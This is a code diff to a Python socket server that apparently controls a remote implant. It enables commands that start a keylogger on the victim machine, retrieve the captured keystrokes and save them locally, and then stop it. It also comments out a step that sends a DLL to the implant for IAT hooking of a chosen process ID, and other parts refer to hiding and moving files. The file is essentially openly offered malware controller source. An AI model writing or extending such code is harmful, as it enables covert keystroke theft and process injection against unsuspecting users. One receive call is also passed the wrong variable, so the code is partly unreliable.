@@ -6,7 +6,7 @@ from SocketManager import SocketManager
 
 IAT_HOOKING_PROCESS_ID = 4604
 IAT_HOOKING_DLL = r"IAT Hooking\IATHookingDLL.dll"
-KEY_LOGGER_FILE = r"C:\Users\admin\Desktop\keyLogger.txt"
+KEY_LOGGER_FILE = r"keyLogger.txt"
 HIDDEN_FILE_PATH = r"C:\Users\admin\Desktop\hidden files.txt"
 DIR_TO_MOVE = r"C:\Users\admin\Desktop\New folder"
 FILE_TO_MOVE = r"C:\Users\admin\Desktop\hidden files.txt"
@@ -34,22 +34,22 @@ def full_bin_file_to_buffer(file_path):
 
     return data
 
-def key_logger_thread(conn, log_file_path):
-    while 1:
-        logger_message = SocketManager.receive(conn)
-        if logger_message == 'KEY_LOGGER_MESSAGE':
-            logger_data = SocketManager.receive(conn)
-            try:
-                with open(log_file_path, 'w') as fp:
-                    fp.write(logger_data)
-            except Exception as ex:
-                print("Directory does not exist")
-                print(ex)
-                # TODO: handle what happens if directory does not exist
-
-
-
-        # TODO: handle what happens if it's not the right message
+# def key_logger_thread(conn, log_file_path):
+#     while 1:
+#         logger_message = SocketManager.receive(conn)
+#         if logger_message == 'KEY_LOGGER_MESSAGE':
+#             logger_data = SocketManager.receive(conn)
+#             try:
+#                 with open(log_file_path, 'w') as fp:
+#                     fp.write(logger_data)
+#             except Exception as ex:
+#                 print("Directory does not exist")
+#                 print(ex)
+#                 # TODO: handle what happens if directory does not exist
+#
+#
+#
+#         # TODO: handle what happens if it's not the right message
 
 
 if __name__ == '__main__':
@@ -61,7 +61,7 @@ if __name__ == '__main__':
     s.listen(1)
 
     conn, addr = s.accept()
-    key_logger_thread_handle = None
+    is_running_key_logger = False
 
     print('Connection address:', addr)
     while 1:
@@ -134,25 +134,28 @@ if __name__ == '__main__':
         # print(data)
 
         # start key logger
-        # SocketManager.send_data(conn, "START_KEY_LOGGER")
-        # key_logger_file = KEY_LOGGER_FILE
-        # # create a new thread of key logger
-        # key_logger_thread_handle = Thread(target=key_logger_thread, args=(conn, key_logger_file,))
-        # key_logger_thread_handle.start()
-        #
-        # # stop key logger
-        # SocketManager.send_data(conn, "STOP_KEY_LOGGER")
-        # # kill the thread of key logger
-        # if key_logger_thread_handle is None or not key_logger_thread_handle.is_alive():
-        #     print("No key logger is running")
-        # else:
-        #     key_logger_thread_handle.
+        SocketManager.send_data(conn, "START_KEY_LOGGER")
 
+        # get key_logger_data
+        SocketManager.send_data(conn, "GET_KEY_LOGGER_DATA")
+        key_logger_data = SocketManager.receive(data)
+        try:
+            with open(KEY_LOGGER_FILE, 'a') as fp:
+                fp.write(key_logger_data)
+
+        except Exception as ex:
+            print("Error openning file")
+            print(ex)
+
+        # stop key logger
+        SocketManager.send_data(conn, "STOP_KEY_LOGGER")
+        if not is_running_key_logger:
+            print("Currently, no key logger is running...")
 
         # IAT Hooking
-        SocketManager.send_data(conn, "IAT_HOOKING")
-        SocketManager.send_data(conn, str(IAT_HOOKING_PROCESS_ID))
-        dll_data = full_bin_file_to_buffer(IAT_HOOKING_DLL)
-        SocketManager.send_data(conn, dll_data)
+        # SocketManager.send_data(conn, "IAT_HOOKING")
+        # SocketManager.send_data(conn, str(IAT_HOOKING_PROCESS_ID))
+        # dll_data = full_bin_file_to_buffer(IAT_HOOKING_DLL)
+        # SocketManager.send_data(conn, dll_data)
 
 conn.close()
